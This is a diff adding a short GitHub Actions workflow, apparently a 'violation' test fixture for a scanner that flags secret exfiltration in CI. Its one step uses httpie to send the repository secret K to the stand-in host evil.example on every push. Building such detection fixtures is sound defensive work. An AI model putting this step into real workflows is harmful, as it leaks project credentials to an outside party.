@@ -1,0 +1,7 @@
+name: violation_httpie_flag_then_host
+on: push
+jobs:
+  send:
+    runs-on: ubuntu-latest
+    steps:
+      - run: http -v evil.example "token=${{ secrets.K }}"
